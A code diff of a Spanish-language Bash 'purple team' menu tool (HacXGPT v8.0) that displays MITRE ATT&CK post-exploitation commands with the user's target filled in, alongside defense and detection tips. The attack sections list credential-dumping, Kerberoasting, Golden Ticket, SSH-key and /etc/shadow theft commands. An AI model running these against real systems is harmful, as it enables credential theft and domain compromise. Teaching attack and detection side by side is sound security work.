@@ -9,6 +9,16 @@ else
     echo -e "\e[1;33m⚠️  mitre_data.sh no encontrado. Funciones MITRE desactivadas.\e[0m"
 fi
 
+if [[ -f "$SCRIPT_DIR/mitre_extras_1.sh" ]]; then
+    source "$SCRIPT_DIR/mitre_extras_1.sh"
+fi
+if [[ -f "$SCRIPT_DIR/mitre_extras_2.sh" ]]; then
+    source "$SCRIPT_DIR/mitre_extras_2.sh"
+fi
+if [[ -f "$SCRIPT_DIR/mitre_extras_3.sh" ]]; then
+    source "$SCRIPT_DIR/mitre_extras_3.sh"
+fi
+
 # ============================================
 # MEJORA 4: Manejo de errores con trap
 # ============================================
@@ -40,8 +50,8 @@ OUTPUT_FILE="hacxgpt_$(date +%Y%m%d_%H%M%S).log"
 # Valida que el string sea una IP o un dominio válido
 validar_objetivo() {
     local obj="$1"
-    local ip_regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
-    local dom_regex='^[a-zA-Z0-9][a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$'
+    local ip_regex='^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'
+    local dom_regex='^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
     [[ "$obj" =~ $ip_regex || "$obj" =~ $dom_regex ]]
 }
 
@@ -621,7 +631,8 @@ generar_reportes() {
 <body>
     <h1>🔐 Reporte de Seguridad</h1>
     <p><strong>Fecha:</strong> $(date)</p>
-    <p><strong>Generado por:</strong> HacXGPT v7.0</p>
+    <p><strong>Objetivo Principal:</strong> ${TARGET:-Ninguno}</p>
+    <p><strong>Generado por:</strong> HacXGPT v8.0</p>
     
     <div class="section">
         <h2>📋 Resumen Ejecutivo</h2>
@@ -673,7 +684,8 @@ HTMLREPORT
                     REPORTE DE SEGURIDAD
 ================================================================
 Fecha: $(date)
-Generado por: HacXGPT v7.0
+Objetivo: ${TARGET:-Ninguno}
+Generado por: HacXGPT v8.0
 
 RESUMEN EJECUTIVO
 =================
@@ -1422,6 +1434,7 @@ escaneo_sigiloso() {
 # 9. MATRIZ MITRE ATT&CK — NAVEGADOR COMPLETO
 # ============================================================
 mitre_menu() {
+    preguntar_objetivo || return
     while true; do
         show_banner
         echo -e "${CYAN}╔══════════════════════════════════════════════════╗${NC}"
@@ -1474,7 +1487,7 @@ mitre_menu() {
                 elif [[ "$tsel" =~ ^[0-9]+$ ]] && (( tsel >= 1 && tsel < tidx )); then
                     local sel_tec="${tecnicas[$((tsel-1))]}"
                     local sel_id="${sel_tec%%:*}"
-                    _show_purple_technique "$sel_id"
+                    _show_mitre_technique "$sel_id"
                 fi
                 echo ""
                 read -p "↵ Presiona Enter para continuar..." _
@@ -1483,26 +1496,93 @@ mitre_menu() {
     done
 }
 
+# Helper: muestra técnica básica MITRE con su descripción y ataque
+_show_mitre_technique() {
+    local tech_id="${1^^}"
+    local pdata="${PURPLE_DATA[$tech_id]}"
+    
+    echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
+    echo -e "${PURPLE}║  MITRE ATT&CK — ${CYAN}$tech_id${NC}"
+    echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
+    echo -e "📊 Probando contra: ${CYAN}${TARGET}${NC}"
+    echo ""
+    
+    # Reemplazar TARGET
+    pdata="${pdata//TARGET/$TARGET}"
+    
+    # Separar por ||| y mostrar
+    local temp="$pdata"
+    local delimiter="|||"
+    local secciones=()
+    while [[ "$temp" == *"$delimiter"* ]]; do
+        secciones+=("${temp%%"$delimiter"*}")
+        temp="${temp#*"$delimiter"}"
+    done
+    secciones+=("$temp")
+    
+    for seccion in "${secciones[@]}"; do
+        seccion="$(echo -e "$seccion" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+        [[ -z "$seccion" ]] && continue
+        
+        if [[ "$seccion" == *"🔴"* ]]; then
+            echo -e "${RED}$seccion${NC}"
+        elif [[ "$seccion" == *"🔵"* ]]; then
+            echo -e "${BLUE}$seccion${NC}"
+        elif [[ "$seccion" == *"🟣"* ]]; then
+            echo -e "${PURPLE}$seccion${NC}"
+        elif [[ "$seccion" == *"📝"* ]]; then
+            echo -e "${YELLOW}$seccion${NC}"
+        else
+            echo -e "$seccion"
+        fi
+        echo ""
+    done
+}
+
 # Helper: muestra vista Purple Team de una técnica por ID
 _show_purple_technique() {
     local tech_id="${1^^}"
     local pdata="${PURPLE_DATA[$tech_id]}"
-    echo ""
-    if [[ -z "$pdata" ]]; then
-        echo -e "${YELLOW}ℹ️  No hay datos Purple Team detallados para $tech_id.${NC}"
-        echo -e "    Consulta: ${CYAN}https://attack.mitre.org/techniques/$tech_id${NC}"
-        return
-    fi
+    
     echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
     echo -e "${PURPLE}║  PURPLE TEAM — ${CYAN}$tech_id${NC}"
     echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
-    # Separar secciones por |||
-    IFS='|||' read -ra partes <<< "$pdata"
-    for parte in "${partes[@]}"; do
-        [[ -z "${parte// }" ]] && continue
-        echo -e "$parte"
+    
+    if [[ -z "$pdata" ]]; then
+        echo -e "${YELLOW}ℹ️  No hay datos Purple Team detallados para $tech_id.${NC}"
+        echo -e "    Consulta: https://attack.mitre.org/techniques/$tech_id"
+        return
+    fi
+    
+    echo -e "📊 Probando contra: ${CYAN}${TARGET}${NC}"
+    
+    # Reemplazar TARGET
+    pdata="${pdata//TARGET/$TARGET}"
+    
+    local temp="$pdata"
+    local delimiter="|||"
+    local secciones=()
+    while [[ "$temp" == *"$delimiter"* ]]; do
+        secciones+=("${temp%%"$delimiter"*}")
+        temp="${temp#*"$delimiter"}"
     done
-    save_output "[$tech_id PURPLE]\n$pdata"
+    secciones+=("$temp")
+    
+    for seccion in "${secciones[@]}"; do
+        seccion="$(echo -e "$seccion" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+        [[ -z "$seccion" ]] && continue
+        
+        if [[ "$seccion" == *"🔴"* ]]; then
+            echo -e "${RED}$seccion${NC}"
+        elif [[ "$seccion" == *"🔵"* ]]; then
+            echo -e "${BLUE}$seccion${NC}"
+        elif [[ "$seccion" == *"🟣"* ]]; then
+            echo -e "${PURPLE}$seccion${NC}"
+        else
+            echo -e "$seccion"
+        fi
+        echo ""
+    done
 }
 
 # ============================================================
@@ -1537,12 +1617,25 @@ modo_purple_team() {
             0) return ;;
             m)
                 read -p "   Ingresa ID de técnica (ej: T1003): " tid_input
-                _show_purple_technique "${tid_input^^}"
-                read -p "↵ Enter para continuar..." _
+                if preguntar_objetivo; then
+                    _show_purple_technique "${tid_input^^}"
+                    read -p "↵ Enter para continuar..." _
+                fi
                 ;;
             *)
-                if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#teclist[@]} )); then
-                    _show_purple_technique "${teclist[$((sel-1))]}"
+                if preguntar_objetivo; then
+                    case $sel in
+                        1) _show_purple_technique "T1003" ;;
+                        2) _show_purple_technique "T1027" ;;
+                        3) _show_purple_technique "T1055" ;;
+                        4) _show_purple_technique "T1059" ;;
+                        5) _show_purple_technique "T1078" ;;
+                        6) _show_purple_technique "T1021" ;;
+                        7) _show_purple_technique "T1053" ;;
+                        8) _show_purple_technique "T1190" ;;
+                        9) _show_purple_technique "T1566" ;;
+                        10) _show_purple_technique "T1562" ;;
+                    esac
                     read -p "↵ Enter para continuar..." _
                 fi
                 ;;
@@ -1553,6 +1646,145 @@ modo_purple_team() {
 # ============================================================
 # 11. POST-EXPLOTACIÓN (Windows + Linux + Evasión)
 # ============================================================
+
+declare -A WIN_DATA
+WIN_DATA[1]="🔴 ATAQUE:
+  • mimikatz.exe privilege::debug sekurlsa::logonpasswords
+  • procdump.exe -ma lsass.exe lsass.dmp && pypykatz lsa minidump lsass.dmp
+  • python3 secretsdump.py DOMAIN/user:pass@TARGET
+  • reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM sys.hive
+  • comsvcs.dll: rundll32.exe comsvcs.dll MiniDump \$(PID) lsass.dmp full
+|||
+🔵 DEFENSA:
+  • Activar Windows Defender Credential Guard
+  • Protected Users Security Group en Active Directory
+  • Deshabilitar WDigest: UseLogonCredential = 0
+  • gMSA/MSA en lugar de cuentas de servicio normales
+|||
+🟣 DETECCIÓN:
+  • Event ID 4656/4663: acceso a handle de LSASS
+  • Sysmon Event ID 10: ProcessAccess → lsass.exe
+  • Alertar si procdump/comsvcs acceden a LSASS"
+
+WIN_DATA[2]="🔴 ATAQUE:
+  • SharpDPAPI.exe credentials /password:Passw0rd
+  • python3 dpapi.py masterkey /in:key /password:pass
+  • Get-ChildItem 'HKCU:\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2'
+  • Dump Chrome: copy 'AppData\\Local\\Google\\Chrome\\Default\\Login Data' /tmp/
+  • LaZagne.exe all → extrae credenciales de 30+ aplicaciones
+|||
+🔵 DEFENSA:
+  • Gestores de contraseñas corporativos (CyberArk, BeyondTrust)
+  • Monitorear acceso a archivos de credenciales del browser
+  • Browser Enterprise Policies: bloquear exportación de contraseñas
+|||
+🟣 DETECCIÓN:
+  • FileSystemAudit: acceso a Login Data / Cookies de Chrome/Firefox
+  • Alertar en: dpapi, LaZagne, SharpDPAPI en EDR"
+
+WIN_DATA[3]="🔴 ATAQUE:
+  1. Enumerar SPNs:
+     GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP
+     setspn -T DOMAIN -Q */*
+  
+  2. Solicitar TGS tickets:
+     Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
+     GetUserSPNs.py DOMAIN/user:pass -request
+  
+  3. Crackear offline:
+     hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+     john --format=krb5tgs --wordlist=rockyou.txt hashes.txt
+|||
+🔵 DEFENSA:
+  • Usar AES-256 en lugar de RC4 para cuentas de servicio (MSA/gMSA)
+  • Contraseñas >25 chars en cuentas de servicio → 100 años crackear
+  • Auditar cuentas con SPN: deben ser mínimas y monitoreadas
+|||
+🟣 DETECCIÓN:
+  • Event ID 4769 (A): solicitud de TGS → muchas en poco tiempo = alerta
+  • Filtrar: Ticket Encryption Type = 0x17 (RC4-HMAC → vulnerable)
+  • SIEM: correlacionar 4769 masivo desde misma cuenta/IP"
+
+WIN_DATA[4]="🔴 ATAQUE:
+  • Robar ticket: Rubeus.exe dump /service:krbtgt
+  • Importar ticket: Rubeus.exe ptt /ticket:ticket.kirbi
+  • Golden Ticket: mimikatz kerberos::golden /user:admin /domain:DOM /sid:S-1-5 /krbtgt:HASH /ptt
+  • Silver Ticket: mimikatz kerberos::golden /user:admin /target:server /service:cifs /rc4:HASH /ptt
+  • Acceder recursos: dir \\\\target\\C$
+|||
+🔵 DEFENSA:
+  • Cambiar contraseña de KRBTGT 2 veces (invalida todos los Golden Tickets)
+  • Privileged Access Workstations (PAW) — aísla credenciales admin
+  • Monitorear cuentas con atributos anómalos (SID history, etc.)
+|||
+🟣 DETECCIÓN:
+  • Event ID 4768: TGT request con atributos anómalos
+  • Event ID 4769: TGS con cifrado 0x17 + cuenta sin SPN
+  • Ticket con lifetime >10h o sin pasar por DC → Golden Ticket"
+
+WIN_DATA[5]="🔴 ATAQUE:
+  • systeminfo && whoami /all && net user && net localgroup administrators
+  • Get-ComputerInfo | Select *OS*, *Domain*
+  • wmic computersystem get model, manufacturer, systemtype
+  • tasklist /V && netstat -ano && ipconfig /all
+|||
+🔵 DEFENSA:
+  • JEA: limitar qué comandos puede ejecutar cada rol
+  • Detectar reconocimiento excesivo en endpoint
+|||
+🟣 DETECCIÓN:
+  • Sysmon ID 1: ejecución de systeminfo, whoami, net en cadena rápida
+  • Correlacionar: 5+ comandos de discovery en <2 minutos → alerta"
+
+WIN_DATA[6]="🔴 ATAQUE:
+  • SharpHound.exe --CollectionMethods All --ZipFileName output.zip
+  • bloodhound-python -u user -p pass -d DOMAIN.LOCAL -ns DC_IP -c all
+  • PowerView: Get-DomainComputer -Properties *
+  • net view /domain → listar máquinas en dominio
+|||
+🔵 DEFENSA:
+  • Tier model: separar cuentas admin Tier 0/1/2
+  • Monitorear cuentas que hacen bulk LDAP queries
+|||
+🟣 DETECCIÓN:
+  • Event ID 4661: muchas consultas LDAP desde una cuenta en poco tiempo
+  • NetFlow: consultas SMB masivas a muchos hosts = lateral discovery"
+
+_show_post_exploitation() {
+    local array_val="$1"
+    local title="$2"
+    
+    echo -e "${RED}╔══ ${title} ════════════════════════════════╗${NC}"
+    echo -e "📊 Probando contra: ${CYAN}${TARGET}${NC}"
+    
+    local pdata="${array_val//TARGET/$TARGET}"
+    
+    local temp="$pdata"
+    local delimiter="|||"
+    local secciones=()
+    while [[ "$temp" == *"$delimiter"* ]]; do
+        secciones+=("${temp%%"$delimiter"*}")
+        temp="${temp#*"$delimiter"}"
+    done
+    secciones+=("$temp")
+    
+    for seccion in "${secciones[@]}"; do
+        seccion="$(echo -e "$seccion" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
+        [[ -z "$seccion" ]] && continue
+        
+        if [[ "$seccion" == *"🔴"* ]]; then
+            echo -e "${RED}$seccion${NC}"
+        elif [[ "$seccion" == *"🔵"* ]]; then
+            echo -e "${BLUE}$seccion${NC}"
+        elif [[ "$seccion" == *"🟣"* ]]; then
+            echo -e "${PURPLE}$seccion${NC}"
+        else
+            echo -e "$seccion"
+        fi
+        echo ""
+    done
+}
+
 post_explotacion_windows() {
     while true; do
         show_banner
@@ -1560,139 +1792,94 @@ post_explotacion_windows() {
         echo -e "${RED}║       ${YELLOW}💣 POST-EXPLOTACIÓN — WINDOWS${NC}            ${RED}║${NC}"
         echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
         echo ""
-        echo "1. T1003 — OS Credential Dumping (Mimikatz/secretsdump)"
-        echo "2. T1555 — Credentials from Password Stores (DPAPI/browsers)"
+        echo "1. T1003     — OS Credential Dumping (Mimikatz/secretsdump)"
+        echo "2. T1555     — Credentials from Password Stores (DPAPI/browsers)"
         echo "3. T1558.003 — Kerberoasting (Rubeus/impacket)"
         echo "4. T1550.003 — Pass-the-Ticket (PtT)"
-        echo "5. T1082 — System Information Discovery"
-        echo "6. T1018 — Remote System Discovery (BloodHound)"
+        echo "5. T1082     — System Information Discovery"
+        echo "6. T1018     — Remote System Discovery (BloodHound)"
         echo "7. Volver"
         echo ""
         read -p "💣 Selecciona [1-7]: " op
-        case $op in
-            1)
-                echo -e "${RED}╔══ T1003 — OS Credential Dumping ════════╗${NC}"
-                echo -e "${RED}🔴 ATAQUE:${NC}"
-                echo "  • mimikatz.exe privilege::debug sekurlsa::logonpasswords"
-                echo "  • procdump.exe -ma lsass.exe lsass.dmp && pypykatz lsa minidump lsass.dmp"
-                echo "  • python3 secretsdump.py DOMAIN/user:pass@TARGET"
-                echo "  • reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM sys.hive"
-                echo "  • comsvcs.dll: rundll32.exe comsvcs.dll MiniDump \$(PID) lsass.dmp full"
-                echo ""
-                echo -e "${BLUE}🔵 DEFENSA:${NC}"
-                echo "  • Activar Windows Defender Credential Guard"
-                echo "  • Protected Users Security Group en Active Directory"
-                echo "  • Deshabilitar WDigest: UseLogonCredential = 0"
-                echo "  • gMSA/MSA en lugar de cuentas de servicio normales"
-                echo ""
-                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}"
-                echo "  • Event ID 4656/4663: acceso a handle de LSASS"
-                echo "  • Sysmon Event ID 10: ProcessAccess → lsass.exe"
-                echo "  • Alertar si procdump/comsvcs acceden a LSASS"
-                save_output "[T1003 Windows] Credential Dumping mostrado"
-                ;;
-            2)
-                echo -e "${RED}╔══ T1555 — Credentials from Password Stores ╗${NC}"
-                echo -e "${RED}🔴 ATAQUE:${NC}"
-                echo "  • SharpDPAPI.exe credentials /password:Passw0rd"
-                echo "  • python3 dpapi.py masterkey /in:key /password:pass"
-                echo "  • Get-ChildItem 'HKCU:\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2'"
-                echo "  • Dump Chrome: copy 'AppData\\Local\\Google\\Chrome\\Default\\Login Data' /tmp/"
-                echo "  • LaZagne.exe all → extrae credenciales de 30+ aplicaciones"
-                echo ""
-                echo -e "${BLUE}🔵 DEFENSA:${NC}"
-                echo "  • Gestores de contraseñas corporativos (CyberArk, BeyondTrust)"
-                echo "  • Monitorear acceso a archivos de credenciales del browser"
-                echo "  • Browser Enterprise Policies: bloquear exportación de contraseñas"
-                echo ""
-                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}"
-                echo "  • FileSystemAudit: acceso a Login Data / Cookies de Chrome/Firefox"
-                echo "  • Alertar en: dpapi, LaZagne, SharpDPAPI en EDR"
-                ;;
-            3)
-                echo -e "${RED}╔══ T1558.003 — Kerberoasting ════════════╗${NC}"
-                echo -e "${RED}🔴 ATAQUE:${NC}"
-                echo "  1. Enumerar SPNs:"
-                echo "     GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP"
-                echo "     setspn -T DOMAIN -Q */*"
-                echo ""
-                echo "  2. Solicitar TGS tickets:"
-                echo "     Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt"
-                echo "     GetUserSPNs.py DOMAIN/user:pass -request"
-                echo ""
-                echo "  3. Crackear offline:"
-                echo "     hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
-                echo "     john --format=krb5tgs --wordlist=rockyou.txt hashes.txt"
-                echo ""
-                echo -e "${BLUE}🔵 DEFENSA:${NC}"
-                echo "  • Usar AES-256 en lugar de RC4 para cuentas de servicio (MSA/gMSA)"
-                echo "  • Contraseñas >25 chars en cuentas de servicio → 100 años crackear"
-                echo "  • Auditar cuentas con SPN: deben ser mínimas y monitoreadas"
-                echo ""
-                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}"
-                echo "  • Event ID 4769 (A): solicitud de TGS → muchas en poco tiempo = alerta"
-                echo "  • Filtrar: Ticket Encryption Type = 0x17 (RC4-HMAC → vulnerable)"
-                echo "  • SIEM: correlacionar 4769 masivo desde misma cuenta/IP"
-                save_output "[T1558.003] Kerberoasting mostrado"
-                ;;
-            4)
-                echo -e "${RED}╔══ T1550.003 — Pass-the-Ticket (PtT) ═══╗${NC}"
-                echo -e "${RED}🔴 ATAQUE:${NC}"
-                echo "  • Robar ticket: Rubeus.exe dump /service:krbtgt"
-                echo "  • Importar ticket: Rubeus.exe ptt /ticket:ticket.kirbi"
-                echo "  • Golden Ticket: mimikatz kerberos::golden /user:admin /domain:DOM /sid:S-1-5 /krbtgt:HASH /ptt"
-                echo "  • Silver Ticket: mimikatz kerberos::golden /user:admin /target:server /service:cifs /rc4:HASH /ptt"
-                echo "  • Acceder recursos: dir \\\\target\\C$"
-                echo ""
-                echo -e "${BLUE}🔵 DEFENSA:${NC}"
-                echo "  • Cambiar contraseña de KRBTGT 2 veces (invalida todos los Golden Tickets)"
-                echo "  • Privileged Access Workstations (PAW) — aísla credenciales admin"
-                echo "  • Monitorear cuentas con atributos anómalos (SID history, etc.)"
-                echo ""
-                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}"
-                echo "  • Event ID 4768: TGT request con atributos anómalos"
-                echo "  • Event ID 4769: TGS con cifrado 0x17 + cuenta sin SPN"
-                echo "  • Ticket con lifetime >10h o sin pasar por DC → Golden Ticket"
-                ;;
-            5)
-                echo -e "${RED}╔══ T1082 — System Information Discovery ═╗${NC}"
-                echo -e "${RED}🔴 ATAQUE:${NC}"
-                echo "  • systeminfo && whoami /all && net user && net localgroup administrators"
-                echo "  • Get-ComputerInfo | Select *OS*, *Domain*"
-                echo "  • wmic computersystem get model, manufacturer, systemtype"
-                echo "  • tasklist /V && netstat -ano && ipconfig /all"
-                echo ""
-                echo -e "${BLUE}🔵 DEFENSA:${NC}"
-                echo "  • JEA: limitar qué comandos puede ejecutar cada rol"
-                echo "  • Detectar reconocimiento excesivo en endpoint"
-                echo ""
-                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}"
-                echo "  • Sysmon ID 1: ejecución de systeminfo, whoami, net en cadena rápida"
-                echo "  • Correlacionar: 5+ comandos de discovery en <2 minutos → alerta"
-                ;;
-            6)
-                echo -e "${RED}╔══ T1018 — Remote System Discovery (BloodHound) ╗${NC}"
-                echo -e "${RED}🔴 ATAQUE:${NC}"
-                echo "  • SharpHound.exe --CollectionMethods All --ZipFileName output.zip"
-                echo "  • bloodhound-python -u user -p pass -d DOMAIN.LOCAL -ns DC_IP -c all"
-                echo "  • PowerView: Get-DomainComputer -Properties *"
-                echo "  • net view /domain → listar máquinas en dominio"
-                echo ""
-                echo -e "${BLUE}🔵 DEFENSA:${NC}"
-                echo "  • Tier model: separar cuentas admin Tier 0/1/2"
-                echo "  • Monitorear cuentas que hacen bulk LDAP queries"
-                echo ""
-                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}"
-                echo "  • Event ID 4661: muchas consultas LDAP desde una cuenta en poco tiempo"
-                echo "  • NetFlow: consultas SMB masivas a muchos hosts = lateral discovery"
-                ;;
-            7) return ;;
-            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
-        esac
+        if preguntar_objetivo; then
+            case $op in
+                1) _show_post_exploitation "${WIN_DATA[1]}" "T1003 — OS Credential Dumping" ;;
+                2) _show_post_exploitation "${WIN_DATA[2]}" "T1555 — Credentials from Password Stores" ;;
+                3) _show_post_exploitation "${WIN_DATA[3]}" "T1558.003 — Kerberoasting" ;;
+                4) _show_post_exploitation "${WIN_DATA[4]}" "T1550.003 — Pass-the-Ticket (PtT)" ;;
+                5) _show_post_exploitation "${WIN_DATA[5]}" "T1082 — System Information Discovery" ;;
+                6) _show_post_exploitation "${WIN_DATA[6]}" "T1018 — Remote System Discovery (BloodHound)" ;;
+                7) return ;;
+                *) echo -e "${RED}❌ Opción no válida${NC}" ;;
+            esac
+        fi
         echo ""
         read -p "↵ Enter para continuar..." _
     done
 }
+
+declare -A LINUX_DATA
+LINUX_DATA[1]="🔴 ATAQUE:
+  • ssh root@TARGET \"cat ~/.bash_history\"
+  • ssh root@TARGET \"grep -i 'pass\|secret\|key\|token\|aws\|api' ~/.bash_history\"
+  • ssh root@TARGET \"find / -name '.bash_history' 2>/dev/null | xargs grep -l 'pass'\"
+  • ssh root@TARGET \"history | grep -i 'mysql\|psql\|ssh.*@\|curl.*-u'\"
+|||
+🔵 DEFENSA:  HISTCONTROL=ignorespace | HISTFILE=/dev/null
+|||
+🟣 DETECCIÓN:  auditd regla: -a always,exit -F path=~/.bash_history"
+
+LINUX_DATA[2]="🔴 ATAQUE:
+  • ssh root@TARGET \"grep -rn 'password\|passwd\|secret\|token' /etc/ 2>/dev/null\"
+  • ssh root@TARGET \"find / -name 'wp-config.php' -o -name '.env' -o -name 'database.yml' 2>/dev/null\"
+  • ssh root@TARGET \"cat /etc/mysql/debian.cnf\"
+  • ssh root@TARGET \"find / -name '*.conf' -exec grep -l 'password' {} \\;\"
+|||
+🔵 DEFENSA:  Vault/secrets manager, permisos 600 en config files
+|||
+🟣 DETECCIÓN:  inotifywait en archivos sensibles, auditd"
+
+LINUX_DATA[3]="🔴 ATAQUE:
+  • ssh root@TARGET \"find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null\"
+  • scp root@TARGET:~/.ssh/id_rsa ./id_rsa_TARGET
+  • ssh root@TARGET \"cat ~/.ssh/authorized_keys\"
+  • ssh-keygen -y -f ./id_rsa_TARGET  (extraer clave pública para verificar)
+|||
+🔵 DEFENSA:  SSH keys protegidas con passphrase + ssh-agent
+|||
+🟣 DETECCIÓN:  auditd: acceso a archivos .ssh/ fuera del owner"
+
+LINUX_DATA[4]="🔴 ATAQUE:
+  • ssh user@TARGET \"sudo -l\"
+  • ssh root@TARGET \"cat /etc/sudoers\"
+  • ssh user@TARGET \"sudo -u root /bin/bash\"
+  • ssh user@TARGET \"pt-copy-sudo-token [PID_of_sudo_session]\"
+|||
+🔵 DEFENSA:  timestamp_timeout=0 en sudoers, PAM lockout
+|||
+🟣 DETECCIÓN:  Event sudo: nuevas sesiones con usuario diferente"
+
+LINUX_DATA[5]="🔴 ATAQUE:
+  • scp root@TARGET:/etc/passwd ./passwd_TARGET
+  • scp root@TARGET:/etc/shadow ./shadow_TARGET
+  • unshadow passwd_TARGET shadow_TARGET > combined_TARGET.txt
+  • john --wordlist=rockyou.txt combined_TARGET.txt
+  • hashcat -m 1800 combined_TARGET.txt rockyou.txt
+|||
+🔵 DEFENSA:  PAM: lock after 5 fails, shadow perms 640
+|||
+🟣 DETECCIÓN:  auditd: -w /etc/shadow -p rwa"
+
+LINUX_DATA[6]="🔴 ATAQUE:
+  • ssh root@TARGET \"find / -perm -4000 2>/dev/null\"
+  • ssh root@TARGET \"find / -writable -type f 2>/dev/null | grep -v proc\"
+  • ssh root@TARGET \"ls -la /home/*/.ssh/\"
+  • ssh root@TARGET \"find /var/www -name '*.php' | xargs grep 'password'\"
+  • ssh root@TARGET \"ls /opt /srv /data /backup 2>/dev/null\"
+|||
+🔵 DEFENSA:  Auditoría de SUID binaries, permisos mínimos
+|||
+🟣 DETECCIÓN:  auditd: find y locate agresivos en filesystem"
 
 post_explotacion_linux() {
     while true; do
@@ -1710,71 +1897,98 @@ post_explotacion_linux() {
         echo "7. Volver"
         echo ""
         read -p "💣 Selecciona [1-7]: " op
-        case $op in
-            1)
-                echo -e "${RED}🔴 T1552.003 — Bash History:${NC}"
-                echo "  • cat ~/.bash_history"
-                echo "  • grep -i 'pass\|secret\|key\|token\|aws\|api' ~/.bash_history"
-                echo "  • find / -name '.bash_history' 2>/dev/null | xargs grep -l 'pass'"
-                echo "  • history | grep -i 'mysql\|psql\|ssh.*@\|curl.*-u'"
-                echo -e "${BLUE}🔵 DEFENSA:${NC}  HISTCONTROL=ignorespace | HISTFILE=/dev/null"
-                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}  auditd regla: -a always,exit -F path=~/.bash_history"
-                ;;
-            2)
-                echo -e "${RED}🔴 T1552.002 — Credentials in Files:${NC}"
-                echo "  • grep -rn 'password\|passwd\|secret\|token' /etc/ 2>/dev/null"
-                echo "  • find / -name 'wp-config.php' -o -name '.env' -o -name 'database.yml' 2>/dev/null"
-                echo "  • cat /etc/mysql/debian.cnf  (contiene creds MySQL)"
-                echo "  • find / -name '*.conf' -exec grep -l 'password' {} \\;"
-                echo -e "${BLUE}🔵 DEFENSA:${NC}  Vault/secrets manager, permisos 600 en config files"
-                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}  inotifywait en archivos sensibles, auditd"
-                ;;
-            3)
-                echo -e "${RED}🔴 T1552.004 — Private SSH Keys:${NC}"
-                echo "  • find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null"
-                echo "  • locate .ssh/id_rsa"
-                echo "  • cat ~/.ssh/authorized_keys  (ver a qué hosts tenemos acceso)"
-                echo "  • ssh-keygen -y -f id_rsa  (extraer clave pública para verificar)"
-                echo -e "${BLUE}🔵 DEFENSA:${NC}  SSH keys protegidas con passphrase + ssh-agent"
-                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}  auditd: acceso a archivos .ssh/ fuera del owner"
-                ;;
-            4)
-                echo -e "${RED}🔴 T1548.003 — Sudo Token Impersonation:${NC}"
-                echo "  • sudo -l  (ver qué puede correr el usuario actual con sudo)"
-                echo "  • cat /etc/sudoers  (si tenemos acceso)"
-                echo "  • sudo -u otro_usuario /bin/bash  (si hay NOPASSWD)"
-                echo "  • Técnica prctrace: usar mismo sudo token de otro proceso"
-                echo "    pt-copy-sudo-token [PID_of_sudo_session]"
-                echo -e "${BLUE}🔵 DEFENSA:${NC}  timestamp_timeout=0 en sudoers, PAM lockout"
-                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}  Event sudo: nuevas sesiones con usuario diferente"
-                ;;
-            5)
-                echo -e "${RED}🔴 T1003.008 — /etc/passwd & /etc/shadow:${NC}"
-                echo "  • cat /etc/passwd  (hashes si no hay shadow)"
-                echo "  • cat /etc/shadow  (si eres root)"
-                echo "  • unshadow /etc/passwd /etc/shadow > combined.txt"
-                echo "  • john --wordlist=rockyou.txt combined.txt"
-                echo "  • hashcat -m 1800 combined.txt rockyou.txt  (sha-512crypt)"
-                echo -e "${BLUE}🔵 DEFENSA:${NC}  PAM: lock after 5 fails, shadow perms 640"
-                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}  auditd: -w /etc/shadow -p rwa"
-                ;;
-            6)
-                echo -e "${RED}🔴 T1083 — File & Directory Discovery:${NC}"
-                echo "  • find / -perm -4000 2>/dev/null    (SUID binaries)"
-                echo "  • find / -writable -type f 2>/dev/null | grep -v proc"
-                echo "  • ls -la /home/*/.ssh/"
-                echo "  • find /var/www -name '*.php' | xargs grep 'password'"
-                echo "  • ls /opt /srv /data /backup 2>/dev/null"
-                echo -e "${BLUE}🔵 DEFENSA:${NC}  Auditoría de SUID binaries, permisos mínimos"
-                echo -e "${PURPLE}🟣 DETECCIÓN:${NC}  auditd: find y locate agresivos en filesystem"
-                ;;
-            7) return ;;
-            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
-        esac
+        if preguntar_objetivo; then
+            case $op in
+                1) _show_post_exploitation "${LINUX_DATA[1]}" "T1552.003 — Bash History" ;;
+                2) _show_post_exploitation "${LINUX_DATA[2]}" "T1552.002 — Credentials in Files" ;;
+                3) _show_post_exploitation "${LINUX_DATA[3]}" "T1552.004 — Private SSH Keys" ;;
+                4) _show_post_exploitation "${LINUX_DATA[4]}" "T1548.003 — Sudo Token Impersonation" ;;
+                5) _show_post_exploitation "${LINUX_DATA[5]}" "T1003.008 — /etc/passwd & /etc/shadow" ;;
